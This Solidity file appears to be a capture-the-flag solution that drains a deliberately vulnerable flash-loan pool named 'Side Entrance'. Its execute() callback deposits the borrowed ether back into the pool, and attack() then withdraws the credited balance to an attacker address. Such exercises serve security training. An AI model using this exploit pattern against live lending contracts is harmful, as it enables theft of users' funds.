// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {

    SideEntranceLenderPool public pool;
    address payable attackerEoa;

    constructor(address _pool, address _attackerEoa) {
        pool = SideEntranceLenderPool(_pool);
        attackerEoa = payable(_attackerEoa);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external override payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable{
        attackerEoa.transfer(msg.value);
    }
}